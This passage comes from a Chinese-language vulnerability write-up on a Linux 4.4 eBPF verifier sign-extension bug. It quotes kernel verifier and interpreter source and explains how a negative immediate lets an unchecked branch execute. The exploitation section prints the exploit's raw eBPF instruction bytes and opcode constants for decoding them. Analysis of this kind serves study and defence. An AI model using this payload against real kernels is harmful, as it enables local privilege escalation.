*/</span></span><br><span class="line">			other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">			other_branch-&gt;regs[insn-&gt;dst_reg].imm = <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			other_branch-&gt;regs[insn-&gt;dst_reg].type = PTR_TO_MAP_VALUE;</span><br><span class="line">			regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">			regs[insn-&gt;dst_reg].imm = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_pointer_value(env, insn-&gt;dst_reg)) &#123;</span><br><span class="line">		verbose(<span class="string">"R%d pointer comparison prohibited\n"</span>, insn-&gt;dst_reg);</span><br><span class="line">		<span class="keyword">return</span> -EACCES;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (BPF_SRC(insn-&gt;code) == BPF_K &amp;&amp;</span><br><span class="line">		   (opcode == BPF_JEQ || opcode == BPF_JNE)) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (opcode == BPF_JEQ) &#123;</span><br><span class="line">			<span class="comment">/* detect if (R == imm) goto</span></span><br><span class="line"><span class="comment">			 * and in the target state recognize that R = imm</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			other_branch-&gt;regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">			other_branch-&gt;regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/* detect if (R != imm) goto</span></span><br><span class="line"><span class="comment">			 * and in the fall-through state recognize that R = imm</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			regs[insn-&gt;dst_reg].type = CONST_IMM;</span><br><span class="line">			regs[insn-&gt;dst_reg].imm = insn-&gt;imm;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (log_level)</span><br><span class="line">		print_verifier_state(env);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="BPF-EXIT"><a href="#BPF-EXIT" class="headerlink" title="BPF_EXIT"></a>BPF_EXIT</h3><p>继续模拟执行分支A中的指令，当指令是BPF_EXIT指令时，，会执行do_check函数中process_bpf_exit中的逻辑，调用pop_stack检查栈中是否还有未检查的指令，如果有则将临时栈中的指令弹出继续模拟执行执行for循环中的检查逻辑；如果env-&gt;head == NULL则说明eBPF程序中BPF_EXIT是最后一条指令，所有指令检查完毕，函数返回-1，insn_idx&lt;0跳出for循环，do_check模拟执行结束。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//do_check</span></span><br><span class="line">process_bpf_exit:</span><br><span class="line">				insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">				<span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					do_print_state = <span class="literal">true</span>;</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/verifier.c#L424</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pop_stack</span><span class="params">(struct verifier_env *env, <span class="keyword">int</span> *prev_insn_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_stack_elem</span> *<span class="title">elem</span>;</span></span><br><span class="line">	<span class="keyword">int</span> insn_idx;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (env-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, <span class="keyword">sizeof</span>(env-&gt;cur_state));</span><br><span class="line">	insn_idx = env-&gt;head-&gt;insn_idx;</span><br><span class="line">	<span class="keyword">if</span> (prev_insn_idx)</span><br><span class="line">		*prev_insn_idx = env-&gt;head-&gt;prev_insn_idx;</span><br><span class="line">	elem = env-&gt;head-&gt;next;</span><br><span class="line">	kfree(env-&gt;head);</span><br><span class="line">	env-&gt;head = elem;</span><br><span class="line">	env-&gt;stack_size--;</span><br><span class="line">	<span class="keyword">return</span> insn_idx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="bpf-prog-run真正执行"><a href="#bpf-prog-run真正执行" class="headerlink" title="__bpf_prog_run真正执行"></a>__bpf_prog_run真正执行</h1><p>当do_check检查结束后，就完成了eBPF的verifier机制的两轮检查，eBPF代码可以真正执行，真正执行调用 __bpf_prog_run函数，函数维护了一个jumptable跳转表，根据insn-&gt;code的类型跳转到不同的逻辑去执行代码。这个函数中有一个寄存器变量regs，它的类型是u64，即64位下的无符号整数类型。函数中涉及到的DST,SRC以及IMM类型如下，可以看到DST和SRC来源于regs，类型为u64，IMM来自类型为bpf_insn的insn，类型为s32。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Named registers */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DST	regs[insn-&gt;dst_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRC	regs[insn-&gt;src_reg]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMM	insn-&gt;imm</span></span><br></pre></td></tr></table></figure></p>
<p>当出现赋值语句时，以前面的BPF_MOV指令为例，当执行ALU_MOV_K时，会将IMM由insn-&gt;imm(s32)有符号整型转成32位的unsigned int类型；当执行ALU64_MOV_K时，会将insn-&gt;imm(s32)有符号整型扩展为64位的unsigned int类型。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/core.c#L195</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> __bpf_prog_run(<span class="keyword">void</span> *ctx, <span class="keyword">const</span> struct bpf_insn *insn)</span><br><span class="line">&#123;</span><br><span class="line">	u64 <span class="built_in">stack</span>[MAX_BPF_STACK / <span class="keyword">sizeof</span>(u64)];</span><br><span class="line">	u64 regs[MAX_BPF_REG], tmp;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">void</span> *jumptable[<span class="number">256</span>] = &#123;</span><br><span class="line">		[<span class="number">0</span> ... <span class="number">255</span>] = &amp;&amp;default_label,</span><br><span class="line">		<span class="comment">/* Now overwrite non-defaults ... */</span></span><br><span class="line">		<span class="comment">/* 32 bit ALU operations */</span></span><br><span class="line">		... ...</span><br><span class="line">	&#125;;</span><br><span class="line">	u32 tail_call_cnt = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">void</span> *ptr;</span><br><span class="line">	<span class="keyword">int</span> off;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONT	 (&#123; insn++; goto select_insn; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CONT_JMP (&#123; insn++; goto select_insn; &#125;)</span></span><br><span class="line"></span><br><span class="line">	FP = (u64) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) &amp;<span class="built_in">stack</span>[ARRAY_SIZE(<span class="built_in">stack</span>)];</span><br><span class="line">	ARG1 = (u64) (<span class="keyword">unsigned</span> <span class="keyword">long</span>) ctx;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Registers used in classic BPF programs need to be reset first. */</span></span><br><span class="line">	regs[BPF_REG_A] = <span class="number">0</span>;</span><br><span class="line">	regs[BPF_REG_X] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">select_insn:</span><br><span class="line">	<span class="keyword">goto</span> *jumptable[insn-&gt;code];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* ALU */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALU(OPCODE, OP)			\</span></span><br><span class="line">	... ...</span><br><span class="line"></span><br><span class="line">	ALU(ADD,  +)</span><br><span class="line">	ALU(SUB,  -)</span><br><span class="line">	ALU(AND,  &amp;)</span><br><span class="line">	ALU(OR,   |)</span><br><span class="line">	ALU(LSH, &lt;&lt;)</span><br><span class="line">	ALU(RSH, &gt;&gt;)</span><br><span class="line">	ALU(XOR,  ^)</span><br><span class="line">	ALU(MUL,  *)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> ALU</span></span><br><span class="line">	... ...</span><br><span class="line">	ALU_MOV_X:</span><br><span class="line">		DST = (u32) SRC;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU_MOV_K:</span><br><span class="line">		DST = (u32) IMM;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU64_MOV_X:</span><br><span class="line">		DST = SRC;</span><br><span class="line">		CONT;</span><br><span class="line">	ALU64_MOV_K:</span><br><span class="line">		DST = IMM;</span><br><span class="line">		CONT;</span><br><span class="line">	... ...</span><br></pre></td></tr></table></figure></p>
<p>既然DST和IMM类型不一致，处理类型为BPF_JMP的指令也存在问题，当指令为JMP_JEQ_K时，会比较DST和IMM的数值是否相等，如果相等，则执行跳转分支insn += insn-&gt;off；同样在JMP_JNE_K中，当DST != IMM时，会执行跳转分支insn += insn-&gt;off。那这就存在一个问题，在模拟执行do_check的check_cond_jmp_op函数中，当指令为BPF_JNE或BPF_JEQ且目的操作数是imm时，会首先检查insn-&gt;imm和目的寄存器的imm是否相等，如果相等则函数认为不相等的分支不会执行，函数直接跳转到pc+off处继续执行检查逻辑，并没有将不相等的分支压入栈中，不相等的这一分支就直接越过了模拟执行的检查，因为函数认为这一分支根本不会执行到，只有在不确定条件跳转时才会先检查分支A，将分支B压入栈中，分支A执行到BPF_EXIT，再弹出分支B继续模拟执行。但是在真正执行时，目标寄存器DST的类型是u64，而IMM的类型是s32，当DST和IMM进行比较时，imm会由s32先符号扩展为s64，然后再由s64转换为u64,如果IMM是负数，转换后会曲解IMM的值，从而造成DST和IMM不相等，逃避检查的不相等的分支可以得到执行，而且它顺利通过了do_check中的检查。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/linux/v4.4.110/source/kernel/bpf/core.c#L473</span></span><br><span class="line">	<span class="comment">/* JMP */</span></span><br><span class="line">	JMP_JA:</span><br><span class="line">		insn += insn-&gt;off;</span><br><span class="line">		CONT;</span><br><span class="line">	JMP_JEQ_X:</span><br><span class="line">		<span class="keyword">if</span> (DST == SRC) &#123;</span><br><span class="line">			insn += insn-&gt;off;</span><br><span class="line">			CONT_JMP;</span><br><span class="line">		&#125;</span><br><span class="line">		CONT;</span><br><span class="line">	JMP_JEQ_K:</span><br><span class="line">		<span class="keyword">if</span> (DST == IMM) &#123;  <span class="comment">//here</span></span><br><span class="line">			insn += insn-&gt;off;</span><br><span class="line">			CONT_JMP;</span><br><span class="line">		&#125;</span><br><span class="line">		CONT;</span><br><span class="line">	JMP_JNE_X:</span><br><span class="line">		<span class="keyword">if</span> (DST != SRC) &#123;</span><br><span class="line">			insn += insn-&gt;off;</span><br><span class="line">			CONT_JMP;</span><br><span class="line">		&#125;</span><br><span class="line">		CONT;</span><br><span class="line">	JMP_JNE_K:</span><br><span class="line">		<span class="keyword">if</span> (DST != IMM) &#123;  <span class="comment">//here</span></span><br><span class="line">			insn += insn-&gt;off; </span><br><span class="line">			CONT_JMP;</span><br><span class="line">		&#125;</span><br><span class="line">		CONT;</span><br><span class="line">	JMP_JGT_X:</span><br><span class="line">		<span class="keyword">if</span> (DST &gt; SRC) &#123;</span><br><span class="line">			insn += insn-&gt;off;</span><br><span class="line">			CONT_JMP;</span><br><span class="line">		&#125;</span><br><span class="line">		CONT;</span><br><span class="line">	... ...</span><br><span class="line"></span><br><span class="line">		CONT;</span><br><span class="line">	JMP_EXIT:</span><br><span class="line">		<span class="keyword">return</span> BPF_R0;</span><br><span class="line">	... ...</span><br><span class="line"></span><br><span class="line">	default_label:</span><br><span class="line">		<span class="comment">/* If we ever reach this, we have a bug somewhere. */</span></span><br><span class="line">		WARN_RATELIMIT(<span class="number">1</span>, <span class="string">"unknown opcode %02x\n"</span>, insn-&gt;code);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="指令解码"><a href="#指令解码" class="headerlink" title="指令解码"></a>指令解码</h2><p>首先看exp中关键的prog数组，将其转化为eBPF指令，每条指令的长度为8个字节：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">prog = 	[<span class="string">"\xb4\x09\x00\x00\xff\xff\xff\xff"</span>,</span><br><span class="line">		<span class="string">"\x55\x09\x02\x00\xff\xff\xff\xff"</span>,</span><br><span class="line">		<span class="string">"\xb7\x00\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x18\x19\x00\x00\x03\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x00\x00\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span>,</span><br><span class="line">		<span class="string">"\x62\x0a\xfc\xff\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x79\x06\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span>,</span><br><span class="line">		<span class="string">"\x62\x0a\xfc\xff\x01\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x79\x07\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\xbf\x91\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\xbf\xa2\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x07\x02\x00\x00\xfc\xff\xff\xff"</span>,</span><br><span class="line">		<span class="string">"\x62\x0a\xfc\xff\x02\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x85\x00\x00\x00\x01\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x55\x00\x01\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x79\x08\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\xbf\x02\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\xb7\x00\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x55\x06\x03\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x79\x73\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x7b\x32\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x55\x06\x02\x00\x01\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x7b\xa2\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x7b\x87\x00\x00\x00\x00\x00\x00"</span>,</span><br><span class="line">		<span class="string">"\x95\x00\x00\x00\x00\x00\x00\x00"</span>]</span><br><span class="line"></span><br><span class="line">#define BPF_CLASS(code) ((code) &amp; <span class="number">0x07</span>)</span><br><span class="line">BPF_LD = <span class="number">0x00</span></span><br><span class="line">BPF_LDX = <span class="number">0x01</span></span><br><span class="line">BPF_ST = <span class="number">0x02</span></span><br><span class="line">BPF_STX = <span class="number">0x03</span></span><br><span class="line">BPF_ALU = <span class="number">0x04</span></span><br><span class="line">BPF_JMP = <span class="number">0x05</span></span><br><span class="line">BPF_RET = <span class="number">0x06</span></span><br><span class="line">BPF_MISC = <span class="number">0x07</span></span><br><span class="line"></span><br><span class="line">#define BPF_SIZE(code)  ((code) &amp; <span class="number">0x18</span>)</span><br><span class="line">BPF_W = <span class="number">0x00</span></span><br><span class="line">BPF_H = <span class="number">0x08</span></span><br><span class="line">BPF_B = <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">#define BPF_MODE(code)  ((code) &amp; <span class="number">0xe0</span>)</span><br><span class="line">BPF_IMM = <span class="number">0x00</span></span><br><span class="line">BPF_ABS = <span class="number">0x20</span></span><br><span class="line">BPF_IND = <span class="number">0x40</span></span><br><span class="line">BPF_MEM = <span class="number">0x60</span></span><br><span class="line">BPF_LEN = <span class="number">0x80</span></span><br><span class="line">BPF_MSH = <span class="number">0xa0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#BPF_OP(code)    ((code) &amp; <span class="number">0xf0</span>)</span><br><span class="line">BPF_ADD = <span class="number">0x00</span></span><br><span class="line">BPF_SUB = <span class="number">0x10</span></span><br><span class="line">BPF_MUL = <span class="number">0x20</span></span><br><span class="line">BPF_DIV = <span class="number">0x30</span></span><br><span class="line">BPF_OR = <span class="number">0x40</span></span><br><span class="line">BPF_AND = <span class="number">0x50</span></span><br><span class="line">BPF_LSH = <span class="number">0x60</span></span><br><span class="line">BPF_RSH = <span class="number">0x70</span></span><br><span class="line">BPF_NEG = <span class="number">0x80</span></span><br><span class="line">BPF_MOD = <span class="number">0x90</span></span><br><span class="line">BPF_XOR = <span class="number">0xa0</span></span><br><span class="line"></span><br><span class="line">BPF_JA = <span class="number">0x00</span></span><br><span class="line">BPF_JEQ = <span class="number">0x10</span></span><br><span class="line">BPF_JGT = <span class="number">0x20</span></span><br><span class="line">BPF_JGE = <span class="number">0x30</span></span><br><span class="line">BPF_JSET = <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">#define BPF_SRC(code)   ((code) &amp; <span class="number">0x08</span>)</span><br><span class="line">BPF_K = <span class="number">0x00</span></span><br><span class="line">BPF_X = <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">#<span class="comment">/* instruction classes */</span></span><br><span class="line">BPF_ALU64 = <span class="number">0x07</span>	#<span class="comment">/* alu mode in double word width */</span></span><br><span class="line"></span><br><span class="line">#<span class="comment">/* ld/ldx fields */</span></span><br><span class="line">BPF_DW = <span class="number">0x18</span>	#<span class="comment">/* double word */</span></span><br><span class="line">BPF_XADD = <span class="number">0xc0</span>	#<span class="comment">/* exclusive add */</span></span><br><span class="line"></span><br><span class="line">#<span class="comment">/* alu/jmp fields */</span></span><br><span class="line">BPF_MOV = <span class="number">0xb0</span>	#<span class="comment">/* mov reg to reg */</span></span><br><span class="line">BPF_ARSH = <span class="number">0xc0</span>	#<span class="comment">/* sign extending arithmetic shift right */</span></span><br><span class="line"></span><br><span class="line">#<span class="comment">/* change endianness of a register */</span></span><br><span class="line">BPF_END = <span class="number">0xd0</span>	#<span class="comment">/* flags for endianness conversion: */</span></span><br><span class="line">BPF_TO_LE = <span class="number">0x00</span>	#<span class="comment">/* convert to little-endian */</span></span><br><span class="line">BPF_TO_BE = <span class="number">0x08</span>	#<span class="comment">/* convert to big-endian */</span></span><br><span class="line"></span><br><span class="line">BPF_JNE = <span class="number">0x50</span>	#<span class="comment">/* jump != */</span></span><br><span class="line">BPF_JSGT = <span class="number">0x60</span>	#<span class="comment">/* SGT is signed '&gt;', GT in x86 */</span></span><br><span class="line">BPF_JSGE = <span class="number">0x70</span>	